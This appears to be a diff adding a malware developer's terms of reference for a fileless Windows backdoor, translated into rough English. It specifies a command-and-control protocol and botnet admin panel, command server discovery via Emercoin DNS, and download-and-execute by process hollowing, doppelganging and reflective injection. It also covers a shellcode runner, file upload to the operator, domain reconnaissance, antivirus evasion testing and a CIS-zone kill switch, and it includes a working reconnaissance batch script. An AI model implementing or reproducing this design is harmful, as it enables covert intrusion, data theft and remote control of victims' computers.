@@ -1,0 +1,658 @@
+MINIMALIST BACKDOOR
+TERMS OF REFERENCE
+
+PURPOSE
+To develop a backdoor (a kind of lightweight bot) that does not use the current code base, minimally sufficient to be fixed on the target computers,
+which, if possible, does not save anything to the hard drive (fileless technology)
+Hereinafter, "bot" and "backdoor" are synonymous words.
+
+REQUIREMENTS
+Backdoor must have the following functionality:
+*- latch on to the system (survive a system reboot)
+- Communicate with the admins, report status, and receive commands from them
+- DO NOT need to bypass UAC
+- DO NOT elevate privileges
+- obtain command server addresses from publicly available services (emercoin dns, google cache, bitcoin transaction amounts, etc. - the simpler the better)
+- work through proxy, if it is specified in operating system settings (inetcpl.cpl -> Connection -> Proxy settings)
+- Collect and send to the server the information about your system: **
+  - OS version and bit
+  - antivirus type and version
+  - Possibly a list of installed software
+  (customer's comment: it is not important if we know about antivirus - but generally it is possible, it is not a burden, if we do so with a list of processes - then you can add additional search for PID in admin panel)
+  - username
+  - computer name
+  - whether the computer is in a domain or not (if so, then the domain name)
+  - list of domains and information about the domain
+  (customer note: cmd /c net view /all | /c net view /all /domain | /c nltest /domain_trusts /all_trusts + add a poll of domain user administrator, as implemented in trike)
+  - directory from where you run
+- traffic to the command server should be masked if possible (ideally, not TCP)
+- be able to download and run an .exe or .dll
+- must have protection against botnet hijacking if the server is compromised or the padding is compromised (i.e. having access to the command and control server is not enough to
+to redirect control of the entire botnet to another command and control server).
+- immediate failure when working in the .ru/CIS zone - cut on the backend; also check for
+  Russian layout.
+*- removal by command
+
+* Items with an asterisk: it is assumed that the bot will be non-resident, i.e. will NOT be anchored in the system.
+Therefore, everything that concerns residency (fixing, updating, deleting) in this version should NOT be done.
+But the stubs remain, and the idea is that individual (point) executions can be resident and support these functions.
+** collection of information can be put in an external script and not be part of the backdoor.
+
+All additional functionality (including the interactive shell) is REALIZED by a HUNDRED SOFTWARE loaded on command.
+You can pick up any load to run. What we do not have in the publisher, we can adapt to run as an .exe (socks, etc.).
+
+
+REALIZATION
+
+0. General requirements
+The backdoor should adhere to the following rules:
+- do not save anything in the form of files, if possible also its body (fileless)
+- Use unprivileged user rights
+- The minimum OS version is Windows 7/Windows 2008 (no R2)
+- the main working version - 32-bit build, which must work with both 32- and 64-bit (running files).
+- A 64-bit build is also included.
+
+Fileless means that much of the functionality is implemented by powershell, wscript, jscript and other built-in Windows interpreters.
+If you need to save something to disk, you should use steganography - mimicking valid file types
+(images, cryptographic certificates .p12, .pfx, .crt, etc.), saving .exe body in the registry, file streams (ntfs file streams)
+and other non-obvious places.
+
+The backdoor should be made according to the "code and builds design" requirements.
+In addition, you need to minimize the size of the binary file - by turning off all sorts of security checks Visual Studio (maybe use a different compiler?),
+disabling the standard library as much as possible, etc.
+
+It is necessary to prepare projects for building in different compilers (at least, besides Visual Studio - also MinGW, probably clang) in order to increase the variability of binary compilers.
+
+The bot can be arranged both as an .exe and as a .dll (for easier launching from the loader,
+Deployment of .dll from memory is easier than fileless launching of .exe).
+In this case, the entry point to the .dll is the DllMain(DLL_PROCESS_ATTACH) function
+
+1 Identification.
+A backdoor must be uniquely identified by a unique identifier.
+It is suggested to use md5-hash from the string "creation_date%windir%.computer_name.creation_date%windir\system32%.domain_name_or_workgroup",
+and use NOT a hex representation, but the usual 10-bit hash representation as a long 128-bit number.
+- The ID must be generated every time
+- it must be the same for different users of the system
+- it must not be saved to the disk
+- it must be unique
+
+The second important identifier is the group - a string of any length. It is not interpreted by the bot itself in any way.
+It is written into the binary at the build stage; its only purpose from the bot's point of view is to be sent to the server.
+
+If the bot does not have a hardwired group in the body of the bot itself, the bot _does_ not send the value of the group in queries (see below).
+
+The ID is needed to distinguish one bot from another.
+Group is needed to know the owner of the bot (the operator who has access to its actions).
+
+
+2. Protection against control hijacking
+Possible scenarios for botnet control hijacking are as follows:
+- Seizing control of a compromised pad
+- Domain name spoofing on DNS servers
+
+Protection consists of validating command servers by digital signature, and redundant connections.
+The connection and validation algorithm is described in detail in the TOR Resident Loader.
+
+
+BACKEND EXCHANGE PROTOCOL
+
+General requirements.
+All exchange is by HTTP(S) protocol. It is possible to tunnel the protocol through other transports (DNS, ICMP) in order to pass firewalls and hide traffic,
+But the base is HTTP.
+
+All requests contain in the URI backdoor identifier, operation type and parameters, e.g.
+GET /%id%/%operation%/%params%
+
+A response with an HTTP code 200 is considered a success; all codes not equal to 200 indicate an error situation.
+
+The group must be transmitted in any request to the server as a Cookie header with the group name and group value.
+
+All commands for downloading a file from the network assume that the file is encrypted.
+XOR is used as the encryption algorithm. The key is the backdoor identifier in HEX representation.
+It is assumed that the admin area will prepare and provide a download link
+encrypted file body for each bot.
+It is assumed that the admin will cache frequently run files to save on the number of
+number of downloads to the admin panel.
+
+All commands to send data to the server (POST) involve the same encryption of the contents of the POST request body.
+
+All commands to run a program assume the following:
+- %cmdline% is used to denote the command line passed to the process to be run. There may be spaces in the command line.
+That is, in a command like "10 https://site.com/file.xyz -c -z -a" the command line is a substring of "-c -z -a",
+which corresponds to the %cmdline% notation in the following examples.
+- In the command line, the %id% macro can be used, instead of which the backdoor ID in decimal representation is used.
+For example, the command "10 1 0 https://site.com/file.xyz -c -z -a -i %id%", received by the backdoor with ID 12345 from the server, has to be converted into
+command line "-c -z -a -i 12345" before passing it to the running process.
+- the VERS environment variable containing bot ID must be set for any running process.
+
+In the future, the list of command line macros can be expanded - to provide.
+
+Scripts and cmd/powershell commands are supposed to be run with the usual CreateProcess().
+Running third-party .exe should be done using the hidden Process Hollowing/Process Doppelganging techniques.
+
+2. Connecting to the command server
+There are several parameters in the backdoor flashed at the build stage:
+- group identifier
+- main server address for communication
+- address of backup emercoin domains (several)
+
+The search and validation algorithm to the server is described in the TOR Resident Loader.
+
+If there is any network failure in an already established connection to the server (such as no response by timeout), by default
+- make three retries
+- do a second search for the server according to the algorithm in the Resident Loader TK.
+
+The assumption is that:
+- if it is a temporary network glitch, the backdoor will resume trying to work after the computer reboots
+- if it is a permanent outage, it is better to keep quiet and not reveal its presence on the system.
+
+After the IP address is resolved from the Emercoin domain, the IP address must be converted by an XOR 254 operation for each octet.
+For example, 124.245.101.251 (obtained from DNS response) -> 130.11.155.5
+
+Since the DNS information is available to everyone, this protects against abuses from addresses taken from the DNS record.
+
+Script code ipxor.ps1 in PowerShell:
+$ip = read-host -prompt "Enter IP";
+write-host $ip;
+$newip = ';
+($ip.split('.') | foreach {
+    $octet = [byte] ( $_)
+    $octet = $octet -bxor 254;
+    $newip = -join($newip,'.',$octet);
+}
+)
+write-host $newip;
+
+
+4. Command request:
+GET /%id%/2
+
+Answer: text of the form "code_command parameters"
+
+The bot makes this request:
+- by default every 5 minutes
+- or by the value from the last NOP response (see below)
+
+Most commands block execution (running files for execution with a non-zero timeout value),
+i.e. it is supposed to wait for the result of the previous command before executing the next one.
+If the previous command was a blocking command, the HTTP command request is done anyway, but all commands except 14 (state reset) are ignored.
+
+Command codes and parameters:
+
+0 NOP %time% - no operation. Time - the number of seconds for which the bot should fall asleep before the next bounce to the server.
+1 %time% Get information about the system. Time - the number of seconds the bot should fall asleep before the next reply to the server.
+The time parameter is optional.
+* System information can also be obtained by launching a .cmd script (command 12)
+10 %runtype% %timeout% %mask_process% %URI% %cmdline% - downloading and launching the .exe file
+10 4 [%mode% %cmdline%]
+- %runtype% - 1 for normal startup (CreateProcess; arbitrary run file)
+              2 to use the process hollowing technique (the file run with the same size as the backdoor).
+              3 to use process doppelganging technique (same bit-size file as backdoor)
+                (It is possible to use the Process Herpaderping technique)
+              4 self-updating: replace the loader body with the downloaded file and restart.
+                If the body is empty, start the bootloader self-updating (the same as mode 0, left for compatibility)
+                %mode% - launch mode:
+                0 - no file (run the looder that started this bot and terminate it)
+                1 - exe-loader, run with the command: filename.exe %cmdline%
+                2 - dll-loder, run the command: rundll32 filename.dll,%cmdline%
+                3 - dll-loder, run with the command: regsvr32 /s filename.dll %cmdline%
+                4 - js-loader (the launch method must be specified).
+cmdline - command line parameters
+the first parameter for mode=2 is the name of the export function - entry point to the loeder
+              5 drop file to disk without startup. cmdline specifies the full path where to put the file.
+- %timeout% - timeout of command execution, in seconds. 0 - do not wait for command execution (assume that command will be executed as background process)
+  If the timeout is specified, the bot should wait for the execution of the command and give the code and the status of its completion with a subsequent request.
+  At the same time, the bot cannot accept commands to start new processes before the current one is finished (the arrival of such a command from the admin panel is considered an error and is ignored by the bot).
+  If no timeout is specified, the process is considered a background process, the bot does not care about it, and it can launch new processes without any limitation.
+  If process doesn't finish within specified timeout, bot interrupts the process and signals an error to server.
+- %mask_process% - process name for masking process hollowing/process doppelganging
+                   0 - do not use
+                   1 - notepad.exe
+                   2 - explorer.exe
+                   3 - svchost.exe
+                   4 - cmd.exe
+- %URI% - the link from where to download the file (and decrypt it); one attempt to download a file, if unsuccessful - the response to the command is "could not download file from %uri%"
+In the protocol version 2 this parameter is absent (here and in other commands), the load is sent in the body of the GET-response.
+- %cmdline% - command line for starting (optional)
+11 %runtype% %pid% %timeout% %URI% %cmdline% - download and start the .dll file
+- %runtype% 0 - rundll% It is supposed to be run by rundll32.exe command as follows
+                        rundll32.exe dllname.dll,%cmdline%
+             1 - regsvr Supposed to be run by regsvr.exe command as follows:
+                        regsvr.exe dllname.dll %cmdline%
+                        The dll entry point name is always DllRegisterServer
+             2 - regsvr (silent) Same as 1, only it is launched in "silent" mode, the command is: regsvr32.exe /s dllname.dll %cmdline%
+             3 is a process injection in %pid%.
+                 3 and 4 are a blueprint for
+                 It is supposed to use the technique of reflexive injection https://github.com/dismantl/ImprovedReflectiveDLLInjection.
+                 The name of the bootstrap function (in the original ReflectiveLoader) is passed to the first parameter %cmdline.
+             4 - reflective injection into your own process
+- %pid% 0 is not used (for runtype 0 1 3)
+             not 0 - process number for reflective injection
+12 %runtype% %timeout% [%cmdline%]\r\n%script% - launch .bat-script with parameters
+- %runtype% - 1 run the script through a channel (see note to the command 13 on launching techniques)
+              2dump the script to disk and launch it via CreateProcess
+- %cmdline% - command line of the script itself (i.e. the %1, %2, etc. parameters passed to the .bat script are NOT the command line of cmd.exe!
+parameter is optional
+the script text is after the \r\n line separator
+When you run the script with a dump to disk, the name of the file with the script is autogenerated; after execution the temporary file with the script is deleted
+13 %runtype% %timeout% [%cmdline%]\r\n%script% - running powershell script with parameters
+- %runtype% - 1 run the script through the channel
+              2dump the script to the disk and run it via CreateProcess
+- %cmdline% - is the command line of the script itself (i.e. what is passed to argv in .ps1-script is NOT the command line of powershell.exe!
+The script text is after the line separator \r\n
+In protocol version 2, the script text is passed to the body of the GET-response.
+It is supposed to be run as follows:
+runtype = 1
+  opens a channel in a parent process, its descriptor is specified in STARTUPINFO when starting powershell.exe, then the script is written to this channel.
+  The way you run powershell is as follows:
+  powershell -
+runtype = 2
+  powershell -executionpolicy bypass -file tmpscript.ps1 %cmdline%
+When running the script with a dump to disk, the file name of the script is autogenerated; after execution the temporary file with the script is deleted
+14 - reset. Reset handler of previous command. If the previous command has a state (waiting for process result),
+we reset that state and don't wait for anything else.
+15 %pid% - stop the process (TerminateProcess)
+16 filename - upload file from computer to server
+17 %hexcode% - to launch an arbitrary binary code in the context of its own process,
+   using the following technique https://github.com/DimopoulosElias/SimpleShellcodeInjector/blob/master/SimpleShellcodeInjector.c
+   Code format: AB CD EF 01 23 45 67 - 16-character space-delimited string, uppercase, WITHOUT string translations, length limited to 1 megabyte.
+   No timeout is used. Shell code is assumed to be non-blocking.
+18 %timeout% to commit to the system. It is assumed that the bot is not latching itself, but the loader.
+100 Remove from the system.
+The command is only relevant for the version of the bot which uses anchoring in the system.
+
+5. Result of the previous command
+POST /%id%/3
+The response body contains form/urlencoded wrapped text.
+The interpretation depends on the previous command.
+
+It is assumed that until the response to the command, subsequent commands from the admin panel are blocked
+(otherwise it will be impossible to understand which command was answered).
+
+The bot sends the result in a loop until it receives any response from the server (including erroneous - HTTP codes 40*, 50*)
+If there was a transmission timeout during the three attempts, the bot doubles the sending intervals until it reaches an interval of 30 minutes.
+Until a reply is sent, the bot does not pick up new tasks.
+
+5.0. Response to file start commands
+For file commands, the response consists of two parts: the process identifier, and the program output (stdout And stderr), separated by a newline character.
+
+pid=1234
+stdout and stderr here
+
+If a startup error occurs, 0 (zero) is given as the identifier and the next line is the error message.
+
+5.1 Response to command 1 with system information
+The body of the POST request is sent in form/urlencoded packaging, with the following fields:
+group=%group name%
+path=full path to the binary backdoor file (if not using a completely fileless technology)
+os=3-7 digits containing major-version, minor-version and build of the operating system, if the system has any
+(e.g. for 6.1 build 7600 this will be 617600).
+os[1]=indicator of the OS type (W=Windows) and version
+os[2]=build OS
+os[3]=ProductInfo https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getproductinfo
+For Windows 7 (Version 6.1 build 7600 ProductInfo 0x00) this would be os[1]=W61&os[2]=7600&os[3]=00
+arch=architecture: 86 or 64
+cname=computer name
+uname=user name
+av[]=tivirus type
+avp[]=version of antivirus
+domain=domain or workgroup name (can be obtained via NetWkstaGetInfo)
+net=result of net view /all command
+netdomain=result of the command net view /all /domain
+net group "Domain Computers" /domain
+trust=result of the command nltest /domain_trusts /all_trusts
+admin=result of the command net localgroup "administrator"
+admindomain=result of the command net group "domain admins" /dom
+soft=lists of installed programs
+ip=external IP address of the computer
+locale=local
+tz=temporary zone
+ps=process list
+wsl=availability of WSL/WSL2 subsystem on the computer
+
+5.2 Response to command 100 to remove from the system
+OK string in case of success, any arbitrary string describing an error in case of an error.
+
+5.3 Response to command 10-4 self-update
+An arbitrary status string reporting the result of the backdoor's actions or intentions.
+For example, "OK", or "Will autoupdate in 60 seconds", or "Cannot proceed".
+
+5.4 Response to Stop Process Command 15
+The response returns the result of GetLastError() immediately after TerminateProcess()
+as a decimal number
+
+5.5 Response to command 16 to upload the file to the server
+This response returns the contents of the file "as is" without the x-www-urlencoded or multipart/form-data containers so that the transfer size is not bloated
+redundant coding.
+The Content-Length header must be passed.
+Content-Type header value: application/octet-stream
+Files up to 10 megabytes in size are transferred.
+On an attempt to request a file of larger size, an error message is sent in the body, e.g. File too large
+
+Admin accepts and saves the file as part of the history; the file is available for download from the command history of a particular bot.
+
+5.6 Response to command 17 on execution of arbitrary shell code
+An arbitrary status line reporting the results.
+For example:
+HEX parse error
+Done
+Still alive etc.
+
+5.7 Response to command 18 about fixation in the system
+An arbitrary line about the status, reporting the results.
+For example:
+Done
+Error anchoring, error code = %ld
+Still alive etc.
+
+6. Sending a message
+POST /%id%/4
+The POST body contains an arbitrary message, encrypted with XOR %id%
+The backdoor sends the message on its own initiative (not in response to any action or request from the server).
+
+You should use sending messages as infrequently as possible - you shouldn't flood.
+This feature is supposed to be used as remote logging and tracing.
+
+
+ADMIN, REQUIREMENTS
+
+Bot list
+- bots with IP-address, internal id, group, country, last activity, local domain
+  (Note to the customer: if you don't have one, specify that it is a workgroup, add an arbitrary changeable comment)
+- filters and sorting by all fields
+  search through all the system info (OS version, absence/existence of software, etc) is needed
+- pagination or infinite scrolling (the developer's choice)
+
+On the bot page:
+- ability to set a note for the bot (an arbitrary editable text field)
+- time of last activity
+- System information in a separate section/tab
+- commands to the bot (according to the list of commands from the appropriate section)
+- bot history (every event with date-setting, all commands given by the operator with date-time with all results
+bot events (request 4))
+
+It is assumed that after giving a command to the bot, subsequent commands are blocked until a response is received from the bot.
+The blocking is removed after the bot goes offline (more time has passed than the double interval of the bot command request).
+
+IN CASE THE BACKDOOR'S IP-ADDRESS IS GEOLOCATED IN THE CIS ZONE, ALL COMMANDS EXCEPT "DELETE" SHOULD BE PROHIBITED AT THE OPERATOR.
+
+It is supposed to have a directory of frequently executed files (startup cache), both for the convenience of the operator,
+and to save traffic and time on repeated downloads of the same commands in the admin panel.
+
+Access Roles:
+- admin (can create and delete operators and do everything)
+- operator
+The operator's access level is regulated on the basis of:
+- group (in the first version)
+- country (this and further in the second version)
+- IP-address range
+
+
+APPENDIX
+1. Code for obtaining an external IP address
+2. DNS Resolve code via Emercoin
+3. Code to get list of installed programs
+4. Code to run the program via process hollowing/doppelganging
+5. DNS tunnel code for TCP connections
+6. String obfuscation code
+7. System call obfuscation code
+
+
+TEST PLAN
+
+Full functional testing is performed when:
+- testing of a new backdoor implementation
+- significant changes in the version
+- if significant flaws are noticed.
+
+We conduct a smoke test for fixation on a weekly basis.
+
+The AB test is performed on a daily basis and during the preparation of crypts.
+The source (script) is tested for AB
+- after the developer has finished cleaning
+- every morning if the source code was clean before (if there are detects, there is no point in doing this)
+- If there is reason to believe that there are detects.
+Crypt is always tested for AV.
+
+FULL FUNCTIONAL TESTING
+
+We check the entire system - the resident loader, backdoor, admin.
+In the antivirus settings, you need to turn off sending samples and cloud protection, at least at first, so as not to leak samples.
+
+0. We get a set of loaders from the developer - logged and unlogged versions, x86 and x64.
+First we check the logged version, then the unlogged version. We test it on the virtual machines on the network.
+We do this so that we can show the log for any error and call the developer on the machine.
+If there is an error when checking the unlogged version, try to repeat it on the logged one.
+If it happens again on the logged version, fix the log and call the developer.
+If it does NOT happen on the logged version, fix that the bug is present only on the non-logical version.
+Prerequisite for the success of the test at any step - no activity on the target machine screen (popups, messages from AVs etc),
+unless otherwise stipulated (for example, if it is not a special build, which conversely shows the running programs, etc.).
+
+1. Run the loeder on the target VM.
+2. Go to the admin as an operator who has access to the group of this bot.
+Wait for the bounce, within 5 minutes. If there is no feedback, error, stop.
+Bot should appear as "online" if for at least 15 recent minutes with him was a connection.
+3. Execute commands one by one.
+The first command may be executed with a delay (up to 5 minutes) - this is normal.
+3.1 Get System Info.
+This should retrieve system information from the corresponding tab.
+3.2 Run .exe with different combinations of fields Run Type, Host Process (Mask).
+Choose a file which does not require any third-party .dll (statically linked). For example, pscp.exe.
+The command should be executed, and the output of the command should contain the text of the command.
+
+* If timeout = background run is selected, no response to the command is expected - the command is executed in the background and we are not interested in its fate.
+The bot is immediately ready to receive new commands.
+3.3 Run .dll
+TODO
+3.4 Run .bat
+3.4.1 Type a single command, e.g. hostname, whoami, date /t
+Command has to run, it has to have a text output in the output of command.
+3.4.2 Fill in a prepared .bat file with some commands. The tester should know the result of running the file on his machine.
+The script should run, the output text of this script should be in the output of the command.
+3.5 Run PowerShell
+3.5.1. type some special command like $PSVersionTable.PSVersion
+(prints out the version of the Powershell)
+It should run and the output should have the text in it.
+3.5.2 Fill in the prepared .ps1 file from several commands. The tester should know the result of running this file on his machine.
+The script should run, the output text of this script should be in the output of the command.
+3.6. Reset
+Before executing this command, you have to run something long (you can try running .bat timeout 10000),
+which will block commands from being executed by the bot.
+After running Reset, the previous blocking command should be marked as done, the bot is ready to receive the next command.
+3.7 Terminate Process
+The command kills a process by its number (pid)
+To do this you have to prepare the victim process (e.g. run notepad.exe manually and look at its number in task manager).
+After running the command the process must exit.
+3.8 Download File
+The command downloads a file from the target machine (up to 10M in size).
+You should enter the full path to the file in the appropriate field.
+You should be able to download the file after it's finished. You should see the link in the output of the command.
+3.9. suicide
+This command removes the loeder from the target machine.
+After rebooting the machine the bot should not be tapping.
+4. Latching.
+After rebooting the machine bot should bang in the admin area.
+5. Detects.
+There should be no detects on either the loader or the bot.
+6. Updating
+6.1 If you are running an x86 loeder on an x64 machine, the first thing it must do is to update to the x64 version of itself,
+and then boot only the x64 bot.
+In simple words, the loeder should start the bot with the maximum available bit depth.
+6.2.1 Go to the admin area under the role of QA (this is the person who is responsible for releases and updates)
+6.2.2 Prepare a kit with a new version of the bot and loeder, which has the same group, the same upgrade paths.
+6.2.3 Find out from the developer a line with the version of this kit. Note: each file from the kit can have its own version.
+6.2.4. Pour new versions of the files into panels and set the files to the version you found out at the previous step.
+Reboot the target machine. The updates should get to the machine.
+
+REINFORCEMENT TEST
+
+Checked only logout to the admin, restart your computer and re-logout after a restart.
+IMPORTANT!
+It is necessary to check with the developer details of fixing. Launching after reboot may be delayed or by indirect trigger.
+
+ANTIVIRUS DETECTIONS TEST
+
+Autotests on VMs with the right AB are used:
+- by the developer himself in the development and cleaning cycle
+- the tester, for draft testing.
+
+The dyncheck tests are used:
+- Before final issuance to the customer
+- as needed
+This should not be done often, so as not to expose the samples.
+
+In addition, before issuing to the customer, testing must be performed by downloading from the CUSTOMER PROVIDED link,
+with the CUSTOMER PROVIDED file name.
+
+
+OLD TEST PLAN
+This is for history only.
+TEST according to the plan described above!
+We test receiving and executing commands. The backdoor (DB) will ask for a command once every 30 seconds in the admins,
+execute it and send the answer.
+
+2. Commands are selected in the admin panel. Set the timeouts in the commands to 60 seconds.
+
+3. GET /%id%/2 command request, POST /%id%/3 response.
+
+4. Teams.
+
+4.1. "0 %time%" - in the admin no_operation 30 sec.
+no response
+This command should be issued first to speed up testing, because 30 sec will be set for the database forever.
+
+
+4.2. command 10. This command is to send a program to run, which is test32.exe.
+The program test32.exe outputs to stdout the text "test" and a list of received parameters. The database must pass this output to the ADM.
+The general format is 10 %runtype% %timeout% %mask_process% %URI% %cmdline%.
+
+4.2.1 "10 1 60 0 %URI% a b c %id%"
+
+ADM must set %URI% to the address to test32.exe,
+a b c %id% are parameters to test32.exe, output them as they are, together with % signs. %id% is a macro that the database will replace with its id.
+
+The answer to an unsuccessful startup:
+pid=0
+msg=program start error
+
+The answer at a successful start:
+pid=NNNNN
+stdout=output from program
+
+Response on timeout withdrawal:
+pid=NNNNN
+msg=timeout
+
+
+ 
+4.2.2 "10 1 0 0 %URI% a b c %id%"
+same as 4.2.1, but timeout = 0
+
+The answer to an unsuccessful startup:
+pid=0
+msg=program start error
+
+The answer at a successful start:
+pid=NNNN
+msg=program is running
+
+
+4.2.3 "10 2 60 1 %URI% a b c %id%" - process hollowing
+The answers are the same
+
+4.2.4 "10 2 0 1 %URI% a b c %id%" - process hollowing, timeout=0
+The answers are the same
+ 
+4.2.5 "10 3 60 1 %URI% a b c %id%" - process doppelganging
+The answers are the same
+
+4.2.6 "10 3 0 1 %URI% a b c %id%" - process doppelganging, timeout=0
+The answers are the same
+
+4.3. command 11. this command must pass to start the dll, which is used as TestDll32.dll.
+The Start function from TestDll32.dll outputs stdout the text "test dll - start()". The database must pass this output to ADM.
+General format 11 %timeout% %URI% %cmdline%
+
+4.3.1. "11 60 %URI% Start"
+The ADM should set %URI% to the address to TestDll32.dll.
+The answers are the same as in command 10.
+
+4.3.2. "11 0 %URI% Start" - timeout=0
+The answers are the same
+
+
+
+4.4. command 12. Run the cmd script.
+
+4.4.1. "12 60 cmd /c cd c:\&&dir" - running the script without creating a bat file
+the answers are the same as in command 10.
+
+4.4.2. "12 60 cmd /c\r\ncd c:\\r\ndir" - running the script by creating a bat file
+The answers are the same as in command 10.
+
+
+
+4.5. command 13. Run the powershell script.
+
+4.5.1. "13 60 a b c\r\ncd c:\r\ndir" - launching the script by creating a ps1 file
+a b c - parameters for the script, may be absent.
+The answers are the same as in command 10.
+
+
+4.6. command 15. End program.
+4.6.1. "15 %pid%"
+Response:
+msg=MM
+
+4.7. command 100. Deletion from the system.
+4.7.1. "100"
+Response:
+msg=OK
+
+
+SCRIPT TO RETRIEVE INFORMATION ABOUT THE SYSTEM
+
+@echo off
+
+echo General Info:
+systeminfo
+
+echo.
+echo My Username:
+whoami
+
+echo.
+echo Network Neighbourghoud:
+net view /all
+
+echo.
+echo Domain Neighbourghoud:
+net view /all /domain
+
+echo.
+echo Domain Trust:
+nltest /domain_trusts /all_trusts
+
+echo.
+echo Installed Programs:
+reg query hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+
+echo.
+echo Installed Programs (wow64):
+reg query hklm\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+
+echo.
+echo Installed Programs (current user):
+reg query hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+
+echo.
+echo Installed Programs (current user, wow64):
+reg query hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+
+echo.
+echo Process List:
+tasklist
+
+echo.
+echo External IP:
+powershell -executionpolicy bypass -command "$Servers= @('http://checkip.amazonaws.com','https://ipinfo.io/ip','http://api.ipify.org','https://myexternalip.com/raw','http://wtfismyip.com/text','http://ip.anysrc.net/plain/clientip','http://api.ipify.org/?format=text','http://api.ip.sb/ip','http://ident.me/ip'); $i=Get-Random -Minimum 0 -Maximum 8; Write-Host HTTP-DNS request via $Servers[$i]; $ip=Invoke-WebRequest -UseBasicParsing -Uri $Servers[$i]; write-host $ip.content;"
